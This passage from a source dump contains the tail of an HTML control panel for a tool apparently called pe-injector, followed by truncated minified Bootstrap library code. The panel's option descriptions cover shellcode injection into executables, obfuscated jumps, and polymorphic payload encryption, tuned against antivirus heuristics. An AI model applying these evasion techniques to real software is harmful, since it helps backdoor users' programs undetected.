                <p>Set a static name for sections created by the "new section method" flag.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 
      
      <div class="row">  <!-- row 3 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">cross section jump</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="crosssectionjump_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="crosssectionjump_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Inject shellcode with one of the enabled methods and insert an obfuscated jump to the payload in another section. The EP doesn't point to the shellcode now, but this can increase some AV's heuristic detection rate.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">cross section jump iterations</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-6">
                <div class="input-group">
                  <input type="number" id="crosssectionjumpiterations_TXT1" class="form-control" placeholder="loading..." min="1" max="64">
                  <span class="input-group-btn">
                    <button type="button" id="crosssectionjumpiterations_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-6">
                <p>Set how many jump-indirections should be inserted before the shellcode (1-64, 1-5 should be enough, increasing this value can improve some AV's heuristic detection rate).</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 

      <div class="row">  <!-- row 3 -->
        <div class="col-sm-6">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">encrypt shellcode</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-4">
                <div class="btn-group">
                  <button type="button" id="enableencrypt_ON" class="btn btn-success disabled">ON</button>
                  <button type="button" id="enableencrypt_OFF" class="btn btn-danger disabled">OFF</button>
                </div>
              </div>
              <div class="col-md-8">
                <p>Encrypt payload with random keys. The decryption stub is generated and obfuscated individually on-the-fly for each injection, using the integrated polymorphic engine.</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-sm-6">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">shellcode encryption iterations</h3>
            </div>
            <div class="panel-body">
              <div class="col-md-6">
                <div class="input-group">
                  <input type="number" id="encryptiterations_TXT1" class="form-control" placeholder="loading..." min="1" max="16">
                  <span class="input-group-btn">
                    <button type="button" i="encryptiterations_TXT2" class="btn btn-primary"><span class="glyphicon glyphicon-floppy-disk" aria-hidden="true"></span> Save</button>
                  </span>
                </div>
              </div>
              <div class="col-md-6">
                <p>Set how many encryption iterations should be applied (1-16, 1-3 should be enough, increasing this value can improve some AV's heuristic detection rate).</p>
              </div>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 
   
      
      <!-- Admin Settings -->
      <div class="page-header">
        <h2>admin settings</h2>
      </div>

      <div class="row">  <!-- row -->
        <div class="col-md-3">  <!-- Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">globally enable injection</h3>
            </div>
            <div class="panel-body">
              <div class="text-center">
                <div class="btn-group">
                  <button type="button" id="enable_ON" class="btn btn-success btn-lg disabled">ON</button>
                  <button type="button" id="enable_OFF" class="btn btn-danger btn-lg disabled">OFF</button>
                </div>
              </div>
            </div>
          </div>
        </div>  <!-- END Left -->
        <div class="col-md-3">  <!-- middle-Left Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">injector restart</h3>
            </div>
            <div class="panel-body">
              <button type="button" class="btn btn-primary btn-lg center-block" data-toggle="modal" data-target="#myModal">Restart</button>
            </div>
          </div>
        </div>  <!-- END middle-Left -->
        <div class="col-md-3">  <!-- middle-Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">export config</h3>
            </div>
            <div class="panel-body">
              <button type="button" class="btn btn-primary btn-lg center-block" id="inj_export_button">Export</button>
            </div>
          </div>
        </div>  <!-- END middle-Right -->
        <div class="col-md-3">  <!-- Right Panel -->
          <div class="panel panel-primary">
            <div class="panel-heading">
              <h3 class="panel-title">import config</h3>
            </div>
            <div class="panel-body">
              <button type="button" class="btn btn-primary btn-lg center-block" id="inj_import_button">Import</button>
            </div>
          </div>
        </div>  <!-- END Right -->
      </div>  <!-- END row --> 
      
      <!-- HIDDEN RESTART BOX -->
      <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
              <h4 class="modal-title" id="myModalLabel">Injector restart?</h4>
            </div>
            <div class="modal-body">
              <p>
                If the ports or interfaces set incorrectly you won't be able to contact the server through this interface.
                If you've changed the control port you'll have to adjust the settings of this interface too.
              </p>
              <p>Do you really want to restart the server?</p>
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-success" data-dismiss="modal">Close</button>
              <button type="button" class="btn btn-danger" data-dismiss="modal" id="inj_restart_button">Restart</button>
            </div>
          </div>
        </div>
      </div>


    </div> <!-- END main container -->


    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>


    <!-- Bootstrap-JavaScript
    ================================================== -->
    <script src="js/jquery-2.1.3.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    
    
    <!-- My JavaScript
    ================================================== -->
    <script src="js/injector.js"></script>
    <script src="js/getconfig.js"></script>
    
  </body>
</html>

```

`pe-injector-control/html/js/bootstrap.min.js`:

```js
/*!
 * Bootstrap v3.3.4 (http://getbootstrap.com)
 * Copyright 2011-2015 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */
if("undefined"==typeof jQuery)throw new Error("Bootstrap's JavaScript requires jQuery");+function(a){"use strict";var b=a.fn.jquery.split(" ")[0].split(".");if(b[0]<2&&b[1]<9||1==b[0]&&9==b[1]&&b[2]<1)throw new Error("Bootstrap's JavaScript requires jQuery version 1.9.1 or higher")}(jQuery),+function(a){"use strict";function b(){var a=document.createElement("bootstrap"),b={WebkitTransition:"webkitTransitionEnd",MozTransition:"transitionend",OTransition:"oTransitionEnd otransitionend",transition:"transitionend"};for(var c in b)if(void 0!==a.style[c])return{end:b[c]};return!1}a.fn.emulateTransitionEnd=function(b){var c=!1,d=this;a(this).one("bsTransitionEnd",function(){c=!0});var e=function(){c||a(d).trigger(a.support.transition.end)};return setTimeout(e,b),this},a(function(){a.support.transition=b(),a.support.transition&&(a.event.special.bsTransitionEnd={bindType:a.support.transition.end,delegateType:a.support.transition.end,handle:function(b){return a(b.target).is(this)?b.handleObj.handler.apply(this,arguments):void 0}})})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var c=a(this),e=c.data("bs.alert");e||c.data("bs.alert",e=new d(this)),"string"==typeof b&&e[b].call(c)})}var c='[data-dismiss="alert"]',d=function(b){a(b).on("click",c,this.close)};d.VERSION="3.3.4",d.TRANSITION_DURATION=150,d.prototype.close=function(b){function c(){g.detach().trigger("closed.bs.alert").remove()}var e=a(this),f=e.attr("data-target");f||(f=e.attr("href"),f=f&&f.replace(/.*(?=#[^\s]*$)/,""));var g=a(f);b&&b.preventDefault(),g.length||(g=e.closest(".alert")),g.trigger(b=a.Event("close.bs.alert")),b.isDefaultPrevented()||(g.removeClass("in"),a.support.transition&&g.hasClass("fade")?g.one("bsTransitionEnd",c).emulateTransitionEnd(d.TRANSITION_DURATION):c())};var e=a.fn.alert;a.fn.alert=b,a.fn.alert.Constructor=d,a.fn.alert.noConflict=function(){return a.fn.alert=e,this},a(document).on("click.bs.alert.data-api",c,d.prototype.close)}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.button"),f="object"==typeof b&&b;e||d.data("bs.button",e=new c(this,f)),"toggle"==b?e.toggle():b&&e.setState(b)})}var c=function(b,d){this.$element=a(b),this.options=a.extend({},c.DEFAULTS,d),this.isLoading=!1};c.VERSION="3.3.4",c.DEFAULTS={loadingText:"loading..."},c.prototype.setState=function(b){var c="disabled",d=this.$element,e=d.is("input")?"val":"html",f=d.data();b+="Text",null==f.resetText&&d.data("resetText",d[e]()),setTimeout(a.proxy(function(){d[e](null==f[b]?this.options[b]:f[b]),"loadingText"==b?(this.isLoading=!0,d.addClass(c).attr(c,c)):this.isLoading&&(this.isLoading=!1,d.removeClass(c).removeAttr(c))},this),0)},c.prototype.toggle=function(){var a=!0,b=this.$element.closest('[data-toggle="buttons"]');if(b.length){var c=this.$element.find("input");"radio"==c.prop("type")&&(c.prop("checked")&&this.$element.hasClass("active")?a=!1:b.find(".active").removeClass("active")),a&&c.prop("checked",!this.$element.hasClass("active")).trigger("change")}else this.$element.attr("aria-pressed",!this.$element.hasClass("active"));a&&this.$element.toggleClass("active")};var d=a.fn.button;a.fn.button=b,a.fn.button.Constructor=c,a.fn.button.noConflict=function(){return a.fn.button=d,this},a(document).on("click.bs.button.data-api",'[data-toggle^="button"]',function(c){var d=a(c.target);d.hasClass("btn")||(d=d.closest(".btn")),b.call(d,"toggle"),c.preventDefault()}).on("focus.bs.button.data-api blur.bs.button.data-api",'[data-toggle^="button"]',function(b){a(b.target).closest(".btn").toggleClass("focus",/^focus(in)?$/.test(b.type))})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.carousel"),f=a.extend({},c.DEFAULTS,d.data(),"object"==typeof b&&b),g="string"==typeof b?b:f.slide;e||d.data("bs.carousel",e=new c(this,f)),"number"==typeof b?e.to(b):g?e[g]():f.interval&&e.pause().cycle()})}var c=function(b,c){this.$element=a(b),this.$indicators=this.$element.find(".carousel-indicators"),this.options=c,this.paused=null,this.sliding=null,this.interval=null,this.$active=null,this.$items=null,this.options.keyboard&&this.$element.on("keydown.bs.carousel",a.proxy(this.keydown,this)),"hover"==this.options.pause&&!("ontouchstart"in document.documentElement)&&this.$element.on("mouseenter.bs.carousel",a.proxy(this.pause,this)).on("mouseleave.bs.carousel",a.proxy(this.cycle,this))};c.VERSION="3.3.4",c.TRANSITION_DURATION=600,c.DEFAULTS={interval:5e3,pause:"hover",wrap:!0,keyboard:!0},c.prototype.keydown=function(a){if(!/input|textarea/i.test(a.target.tagName)){switch(a.which){case 37:this.prev();break;case 39:this.next();break;default:return}a.preventDefault()}},c.prototype.cycle=function(b){return b||(this.paused=!1),this.interval&&clearInterval(this.interval),this.options.interval&&!this.paused&&(this.interval=setInterval(a.proxy(this.next,this),this.options.interval)),this},c.prototype.getItemIndex=function(a){return this.$items=a.parent().children(".item"),this.$items.index(a||this.$active)},c.prototype.getItemForDirection=function(a,b){var c=this.getItemIndex(b),d="prev"==a&&0===c||"next"==a&&c==this.$items.length-1;if(d&&!this.options.wrap)return b;var e="prev"==a?-1:1,f=(c+e)%this.$items.length;return this.$items.eq(f)},c.prototype.to=function(a){var b=this,c=this.getItemIndex(this.$active=this.$element.find(".item.active"));return a>this.$items.length-1||0>a?void 0:this.sliding?this.$element.one("slid.bs.carousel",function(){b.to(a)}):c==a?this.pause().cycle():this.slide(a>c?"next":"prev",this.$items.eq(a))},c.prototype.pause=function(b){return b||(this.paused=!0),this.$element.find(".next, .prev").length&&a.support.transition&&(this.$element.trigger(a.support.transition.end),this.cycle(!0)),this.interval=clearInterval(this.interval),this},c.prototype.next=function(){return this.sliding?void 0:this.slide("next")},c.prototype.prev=function(){return this.sliding?void 0:this.slide("prev")},c.prototype.slide=function(b,d){var e=this.$element.find(".item.active"),f=d||this.getItemForDirection(b,e),g=this.interval,h="next"==b?"left":"right",i=this;if(f.hasClass("active"))return this.sliding=!1;var j=f[0],k=a.Event("slide.bs.carousel",{relatedTarget:j,direction:h});if(this.$element.trigger(k),!k.isDefaultPrevented()){if(this.sliding=!0,g&&this.pause(),this.$indicators.length){this.$indicators.find(".active").removeClass("active");var l=a(this.$indicators.children()[this.getItemIndex(f)]);l&&l.addClass("active")}var m=a.Event("slid.bs.carousel",{relatedTarget:j,direction:h});return a.support.transition&&this.$element.hasClass("slide")?(f.addClass(b),f[0].offsetWidth,e.addClass(h),f.addClass(h),e.one("bsTransitionEnd",function(){f.removeClass([b,h].join(" ")).addClass("active"),e.removeClass(["active",h].join(" ")),i.sliding=!1,setTimeout(function(){i.$element.trigger(m)},0)}).emulateTransitionEnd(c.TRANSITION_DURATION)):(e.removeClass("active"),f.addClass("active"),this.sliding=!1,this.$element.trigger(m)),g&&this.cycle(),this}};var d=a.fn.carousel;a.fn.carousel=b,a.fn.carousel.Constructor=c,a.fn.carousel.noConflict=function(){return a.fn.carousel=d,this};var e=function(c){var d,e=a(this),f=a(e.attr("data-target")||(d=e.attr("href"))&&d.replace(/.*(?=#[^\s]+$)/,""));if(f.hasClass("carousel")){var g=a.extend({},f.data(),e.data()),h=e.attr("data-slide-to");h&&(g.interval=!1),b.call(f,g),h&&f.data("bs.carousel").to(h),c.preventDefault()}};a(document).on("click.bs.carousel.data-api","[data-slide]",e).on("click.bs.carousel.data-api","[data-slide-to]",e),a(window).on("load",function(){a('[data-ride="carousel"]').each(function(){var c=a(this);b.call(c,c.data())})})}(jQuery),+function(a){"use strict";function b(b){var c,d=b.attr("data-target")||(c=b.attr("href"))&&c.replace(/.*(?=#[^\s]+$)/,"");return a(d)}function c(b){return this.each(function(){var c=a(this),e=c.data("bs.collapse"),f=a.extend({},d.DEFAULTS,c.data(),"object"==typeof b&&b);!e&&f.toggle&&/show|hide/.test(b)&&(f.toggle=!1),e||c.data("bs.collapse",e=new d(this,f)),"string"==typeof b&&e[b]()})}var d=function(b,c){this.$element=a(b),this.options=a.extend({},d.DEFAULTS,c),this.$trigger=a('[data-toggle="collapse"][href="#'+b.id+'"],[data-toggle="collapse"][data-target="#'+b.id+'"]'),this.transitioning=null,this.options.parent?this.$parent=this.getParent():this.addAriaAndCollapsedClass(this.$element,this.$trigger),this.options.toggle&&this.toggle()};d.VERSION="3.3.4",d.TRANSITION_DURATION=350,d.DEFAULTS={toggle:!0},d.prototype.dimension=function(){var a=this.$element.hasClass("width");return a?"width":"height"},d.prototype.show=function(){if(!this.transitioning&&!this.$element.hasClass("in")){var b,e=this.$parent&&this.$parent.children(".panel").children(".in, .collapsing");if(!(e&&e.length&&(b=e.data("bs.collapse"),b&&b.transitioning))){var f=a.Event("show.bs.collapse");if(this.$element.trigger(f),!f.isDefaultPrevented()){e&&e.length&&(c.call(e,"hide"),b||e.data("bs.collapse",null));var g=this.dimension();this.$element.removeClass("collapse").addClass("collapsing")[g](0).attr("aria-expanded",!0),this.$trigger.removeClass("collapsed").attr("aria-expanded",!0),this.transitioning=1;var h=function(){this.$element.removeClass("collapsing").addClass("collapse in")[g](""),this.transitioning=0,this.$element.trigger("shown.bs.collapse")};if(!a.support.transition)return h.call(this);var i=a.camelCase(["scroll",g].join("-"));this.$element.one("bsTransitionEnd",a.proxy(h,this)).emulateTransitionEnd(d.TRANSITION_DURATION)[g](this.$element[0][i])}}}},d.prototype.hide=function(){if(!this.transitioning&&this.$element.hasClass("in")){var b=a.Event("hide.bs.collapse");if(this.$element.trigger(b),!b.isDefaultPrevented()){var c=this.dimension();this.$element[c](this.$element[c]())[0].offsetHeight,this.$element.addClass("collapsing").removeClass("collapse in").attr("aria-expanded",!1),this.$trigger.addClass("collapsed").attr("aria-expanded",!1),this.transitioning=1;var e=function(){this.transitioning=0,this.$element.removeClass("collapsing").addClass("collapse").trigger("hidden.bs.collapse")};return a.support.transition?void this.$element[c](0).one("bsTransitionEnd",a.proxy(e,this)).emulateTransitionEnd(d.TRANSITION_DURATION):e.call(this)}}},d.prototype.toggle=function(){this[this.$element.hasClass("in")?"hide":"show"]()},d.prototype.getParent=function(){return a(this.options.parent).find('[data-toggle="collapse"][data-parent="'+this.options.parent+'"]').each(a.proxy(function(c,d){var e=a(d);this.addAriaAndCollapsedClass(b(e),e)},this)).end()},d.prototype.addAriaAndCollapsedClass=function(a,b){var c=a.hasClass("in");a.attr("aria-expanded",c),b.toggleClass("collapsed",!c).attr("aria-expanded",c)};var e=a.fn.collapse;a.fn.collapse=c,a.fn.collapse.Constructor=d,a.fn.collapse.noConflict=function(){return a.fn.collapse=e,this},a(document).on("click.bs.collapse.data-api",'[data-toggle="collapse"]',function(d){var e=a(this);e.attr("data-target")||d.preventDefault();var f=b(e),g=f.data("bs.collapse"),h=g?"toggle":e.data();c.call(f,h)})}(jQuery),+function(a){"use strict";function b(b){b&&3===b.which||(a(e).remove(),a(f).each(function(){var d=a(this),e=c(d),f={relatedTarget:this};e.hasClass("open")&&(e.trigger(b=a.Event("hide.bs.dropdown",f)),b.isDefaultPrevented()||(d.attr("aria-expanded","false"),e.removeClass("open").trigger("hidden.bs.dropdown",f)))}))}function c(b){var c=b.attr("data-target");c||(c=b.attr("href"),c=c&&/#[A-Za-z]/.test(c)&&c.replace(/.*(?=#[^\s]*$)/,""));var d=c&&a(c);return d&&d.length?d:b.parent()}function d(b){return this.each(function(){var c=a(this),d=c.data("bs.dropdown");d||c.data("bs.dropdown",d=new g(this)),"string"==typeof b&&d[b].call(c)})}var e=".dropdown-backdrop",f='[data-toggle="dropdown"]',g=function(b){a(b).on("click.bs.dropdown",this.toggle)};g.VERSION="3.3.4",g.prototype.toggle=function(d){var e=a(this);if(!e.is(".disabled, :disabled")){var f=c(e),g=f.hasClass("open");if(b(),!g){"ontouchstart"in document.documentElement&&!f.closest(".navbar-nav").length&&a('<div class="dropdown-backdrop"/>').insertAfter(a(this)).on("click",b);var h={relatedTarget:this};if(f.trigger(d=a.Event("show.bs.dropdown",h)),d.isDefaultPrevented())return;e.trigger("focus").attr("aria-expanded","true"),f.toggleClass("open").trigger("shown.bs.dropdown",h)}return!1}},g.prototype.keydown=function(b){if(/(38|40|27|32)/.test(b.which)&&!/input|textarea/i.test(b.target.tagName)){var d=a(this);if(b.preventDefault(),b.stopPropagation(),!d.is(".disabled, :disabled")){var e=c(d),g=e.hasClass("open");if(!g&&27!=b.which||g&&27==b.which)return 27==b.which&&e.find(f).trigger("focus"),d.trigger("click");var h=" li:not(.disabled):visible a",i=e.find('[role="menu"]'+h+', [role="listbox"]'+h);if(i.length){var j=i.index(b.target);38==b.which&&j>0&&j--,40==b.which&&j<i.length-1&&j++,~j||(j=0),i.eq(j).trigger("focus")}}}};var h=a.fn.dropdown;a.fn.dropdown=d,a.fn.dropdown.Constructor=g,a.fn.dropdown.noConflict=function(){return a.fn.dropdown=h,this},a(document).on("click.bs.dropdown.data-api",b).on("click.bs.dropdown.data-api",".dropdown form",function(a){a.stopPropagation()}).on("click.bs.dropdown.data-api",f,g.prototype.toggle).on("keydown.bs.dropdown.data-api",f,g.prototype.keydown).on("keydown.bs.dropdown.data-api",'[role="menu"]',g.prototype.keydown).on("keydown.bs.dropdown.data-api",'[role="listbox"]',g.prototype.keydown)}(jQuery),+function(a){"use strict";function b(b,d){return this.each(function(){var e=a(this),f=e.data("bs.modal"),g=a.extend({},c.DEFAULTS,e.data(),"object"==typeof b&&b);f||e.data("bs.modal",f=new c(this,g)),"string"==typeof b?f[b](d):g.show&&f.show(d)})}var c=function(b,c){this.options=c,this.$body=a(document.body),this.$element=a(b),this.$dialog=this.$element.find(".modal-dialog"),this.$backdrop=null,this.isShown=null,this.originalBodyPad=null,this.scrollbarWidth=0,this.ignoreBackdropClick=!1,this.options.remote&&this.$element.find(".modal-content").load(this.options.remote,a.proxy(function(){this.$element.trigger("loaded.bs.modal")},this))};c.VERSION="3.3.4",c.TRANSITION_DURATION=300,c.BACKDROP_TRANSITION_DURATION=150,c.DEFAULTS={backdrop:!0,keyboard:!0,show:!0},c.prototype.toggle=function(a){return this.isShown?this.hide():this.show(a)},c.prototype.show=function(b){var d=this,e=a.Event("show.bs.modal",{relatedTarget:b});this.$element.trigger(e),this.isShown||e.isDefaultPrevented()||(this.isShown=!0,this.checkScrollbar(),this.setScrollbar(),this.$body.addClass("modal-open"),this.escape(),this.resize(),this.$element.on("click.dismiss.bs.modal",'[data-dismiss="modal"]',a.proxy(this.hide,this)),this.$dialog.on("mousedown.dismiss.bs.modal",function(){d.$element.one("mouseup.dismiss.bs.modal",function(b){a(b.target).is(d.$element)&&(d.ignoreBackdropClick=!0)})}),this.backdrop(function(){var e=a.support.transition&&d.$element.hasClass("fade");d.$element.parent().length||d.$element.appendTo(d.$body),d.$element.show().scrollTop(0),d.adjustDialog(),e&&d.$element[0].offsetWidth,d.$element.addClass("in").attr("aria-hidden",!1),d.enforceFocus();var f=a.Event("shown.bs.modal",{relatedTarget:b});e?d.$dialog.one("bsTransitionEnd",function(){d.$element.trigger("focus").trigger(f)}).emulateTransitionEnd(c.TRANSITION_DURATION):d.$element.trigger("focus").trigger(f)}))},c.prototype.hide=function(b){b&&b.preventDefault(),b=a.Event("hide.bs.modal"),this.$element.trigger(b),this.isShown&&!b.isDefaultPrevented()&&(this.isShown=!1,this.escape(),this.resize(),a(document).off("focusin.bs.modal"),this.$element.removeClass("in").attr("aria-hidden",!0).off("click.dismiss.bs.modal").off("mouseup.dismiss.bs.modal"),this.$dialog.off("mousedown.dismiss.bs.modal"),a.support.transition&&this.$element.hasClass("fade")?this.$element.one("bsTransitionEnd",a.proxy(this.hideModal,this)).emulateTransitionEnd(c.TRANSITION_DURATION):this.hideModal())},c.prototype.enforceFocus=function(){a(document).off("focusin.bs.modal").on("focusin.bs.modal",a.proxy(function(a){this.$element[0]===a.target||this.$element.has(a.target).length||this.$element.trigger("focus")},this))},c.prototype.escape=function(){this.isShown&&this.options.keyboard?this.$element.on("keydown.dismiss.bs.modal",a.proxy(function(a){27==a.which&&this.hide()},this)):this.isShown||this.$element.off("keydown.dismiss.bs.modal")},c.prototype.resize=function(){this.isShown?a(window).on("resize.bs.modal",a.proxy(this.handleUpdate,this)):a(window).off("resize.bs.modal")},c.prototype.hideModal=function(){var a=this;this.$element.hide(),this.backdrop(function(){a.$body.removeClass("modal-open"),a.resetAdjustments(),a.resetScrollbar(),a.$element.trigger("hidden.bs.modal")})},c.prototype.removeBackdrop=function(){this.$backdrop&&this.$backdrop.remove(),this.$backdrop=null},c.prototype.backdrop=function(b){var d=this,e=this.$element.hasClass("fade")?"fade":"";if(this.isShown&&this.options.backdrop){var f=a.support.transition&&e;if(this.$backdrop=a('<div class="modal-backdrop '+e+'" />').appendTo(this.$body),this.$element.on("click.dismiss.bs.modal",a.proxy(function(a){return this.ignoreBackdropClick?void(this.ignoreBackdropClick=!1):void(a.target===a.currentTarget&&("static"==this.options.backdrop?this.$element[0].focus():this.hide()))},this)),f&&this.$backdrop[0].offsetWidth,this.$backdrop.addClass("in"),!b)return;f?this.$backdrop.one("bsTransitionEnd",b).emulateTransitionEnd(c.BACKDROP_TRANSITION_DURATION):b()}else if(!this.isShown&&this.$backdrop){this.$backdrop.removeClass("in");var g=function(){d.removeBackdrop(),b&&b()};a.support.transition&&this.$element.hasClass("fade")?this.$backdrop.one("bsTransitionEnd",g).emulateTransitionEnd(c.BACKDROP_TRANSITION_DURATION):g()}else b&&b()},c.prototype.handleUpdate=function(){this.adjustDialog()},c.prototype.adjustDialog=function(){var a=this.$element[0].scrollHeight>document.documentElement.clientHeight;this.$element.css({paddingLeft:!this.bodyIsOverflowing&&a?this.scrollbarWidth:"",paddingRight:this.bodyIsOverflowing&&!a?this.scrollbarWidth:""})},c.prototype.resetAdjustments=function(){this.$element.css({paddingLeft:"",paddingRight:""})},c.prototype.checkScrollbar=function(){var a=window.innerWidth;if(!a){var b=document.documentElement.getBoundingClientRect();a=b.right-Math.abs(b.left)}this.bodyIsOverflowing=document.body.clientWidth<a,this.scrollbarWidth=this.measureScrollbar()},c.prototype.setScrollbar=function(){var a=parseInt(this.$body.css("padding-right")||0,10);this.originalBodyPad=document.body.style.paddingRight||"",this.bodyIsOverflowing&&this.$body.css("padding-right",a+this.scrollbarWidth)},c.prototype.resetScrollbar=function(){this.$body.css("padding-right",this.originalBodyPad)},c.prototype.measureScrollbar=function(){var a=document.createElement("div");a.className="modal-scrollbar-measure",this.$body.append(a);var b=a.offsetWidth-a.clientWidth;return this.$body[0].removeChild(a),b};var d=a.fn.modal;a.fn.modal=b,a.fn.modal.Constructor=c,a.fn.modal.noConflict=function(){return a.fn.modal=d,this},a(document).on("click.bs.modal.data-api",'[data-toggle="modal"]',function(c){var d=a(this),e=d.attr("href"),f=a(d.attr("data-target")||e&&e.replace(/.*(?=#[^\s]+$)/,"")),g=f.data("bs.modal")?"toggle":a.extend({remote:!/#/.test(e)&&e},f.data(),d.data());d.is("a")&&c.preventDefault(),f.one("show.bs.modal",function(a){a.isDefaultPrevented()||f.one("hidden.bs.modal",function(){d.is(":visible")&&d.trigger("focus")})}),b.call(f,g,this)})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.tooltip"),f="object"==typeof b&&b;(e||!/destroy|hide/.test(b))&&(e||d.data("bs.tooltip",e=new c(this,f)),"string"==typeof b&&e[b]())})}var c=function(a,b){this.type=null,this.options=null,this.enabled=null,this.timeout=null,this.hoverState=null,this.$element=null,this.init("tooltip",a,b)};c.VERSION="3.3.4",c.TRANSITION_DURATION=150,c.DEFAULTS={animation:!0,placement:"top",selector:!1,template:'<div class="tooltip" role="tooltip"><div class="tooltip-arrow"></div><div class="tooltip-inner"></div></div>',trigger:"hover focus",title:"",delay:0,html:!1,container:!1,viewport:{selector:"body",padding:0}},c.prototype.init=function(b,c,d){if(this.enabled=!0,this.type=b,this.$element=a(c),this.options=this.getOptions(d),this.$viewport=this.options.viewport&&a(this.options.viewport.selector||this.options.viewport),this.$element[0]instanceof document.constructor&&!this.options.selector)throw new Error("`selector` option must be specified when initializing "+this.type+" on the window.document object!");for(var e=this.options.trigger.split(" "),f=e.length;f--;){var g=e[f];if("click"==g)this.$element.on("click."+this.type,this.options.selector,a.proxy(this.toggle,this));else if("manual"!=g){var h="hover"==g?"mouseenter":"focusin",i="hover"==g?"mouseleave":"focusout";this.$element.on(h+"."+this.type,this.options.selector,a.proxy(this.enter,this)),this.$element.on(i+"."+this.type,this.options.selector,a.proxy(this.leave,this))}}this.options.selector?this._options=a.extend({},this.options,{trigger:"manual",selector:""}):this.fixTitle()},c.prototype.getDefaults=function(){return c.DEFAULTS},c.prototype.getOptions=function(b){return b=a.extend({},this.getDefaults(),this.$element.data(),b),b.delay&&"number"==typeof b.delay&&(b.delay={show:b.delay,hide:b.delay}),b},c.prototype.getDelegateOptions=function(){var b={},c=this.getDefaults();return this._options&&a.each(this._options,function(a,d){c[a]!=d&&(b[a]=d)}),b},c.prototype.enter=function(b){var c=b instanceof this.constructor?b:a(b.currentTarget).data("bs."+this.type);return c&&c.$tip&&c.$tip.is(":visible")?void(c.hoverState="in"):(c||(c=new this.constructor(b.currentTarget,this.getDelegateOptions()),a(b.currentTarget).data("bs."+this.type,c)),clearTimeout(c.timeout),c.hoverState="in",c.options.delay&&c.options.delay.show?void(c.timeout=setTimeout(function(){"in"==c.hoverState&&c.show()},c.options.delay.show)):c.show())},c.prototype.leave=function(b){var c=b instanceof this.constructor?b:a(b.currentTarget).data("bs."+this.type);return c||(c=new this.constructor(b.currentTarget,this.getDelegateOptions()),a(b.currentTarget).data("bs."+this.type,c)),clearTimeout(c.timeout),c.hoverState="out",c.options.delay&&c.options.delay.hide?void(c.timeout=setTimeout(function(){"out"==c.hoverState&&c.hide()},c.options.delay.hide)):c.hide()},c.prototype.show=function(){var b=a.Event("show.bs."+this.type);if(this.hasContent()&&this.enabled){this.$element.trigger(b);var d=a.contains(this.$element[0].ownerDocument.documentElement,this.$element[0]);if(b.isDefaultPrevented()||!d)return;var e=this,f=this.tip(),g=this.getUID(this.type);this.setContent(),f.attr("id",g),this.$element.attr("aria-describedby",g),this.options.animation&&f.addClass("fade");var h="function"==typeof this.options.placement?this.options.placement.call(this,f[0],this.$element[0]):this.options.placement,i=/\s?auto?\s?/i,j=i.test(h);j&&(h=h.replace(i,"")||"top"),f.detach().css({top:0,left:0,display:"block"}).addClass(h).data("bs."+this.type,this),this.options.container?f.appendTo(this.options.container):f.insertAfter(this.$element);var k=this.getPosition(),l=f[0].offsetWidth,m=f[0].offsetHeight;if(j){var n=h,o=this.options.container?a(this.options.container):this.$element.parent(),p=this.getPosition(o);h="bottom"==h&&k.bottom+m>p.bottom?"top":"top"==h&&k.top-m<p.top?"bottom":"right"==h&&k.right+l>p.width?"left":"left"==h&&k.left-l<p.left?"right":h,f.removeClass(n).addClass(h)}var q=this.getCalculatedOffset(h,k,l,m);this.applyPlacement(q,h);var r=function(){var a=e.hoverState;e.$element.trigger("shown.bs."+e.type),e.hoverState=null,"out"==a&&e.leave(e)};a.support.transition&&this.$tip.hasClass("fade")?f.one("bsTransitionEnd",r).emulateTransitionEnd(c.TRANSITION_DURATION):r()}},c.prototype.applyPlacement=function(b,c){var d=this.tip(),e=d[0].offsetWidth,f=d[0].offsetHeight,g=parseInt(d.css("margin-top"),10),h=parseInt(d.css("margin-left"),10);isNaN(g)&&(g=0),isNaN(h)&&(h=0),b.top=b.top+g,b.left=b.left+h,a.offset.setOffset(d[0],a.extend({using:function(a){d.css({top:Math.round(a.top),left:Math.round(a.left)})}},b),0),d.addClass("in");var i=d[0].offsetWidth,j=d[0].offsetHeight;"top"==c&&j!=f&&(b.top=b.top+f-j);var k=this.getViewportAdjustedDelta(c,b,i,j);k.left?b.left+=k.left:b.top+=k.top;var 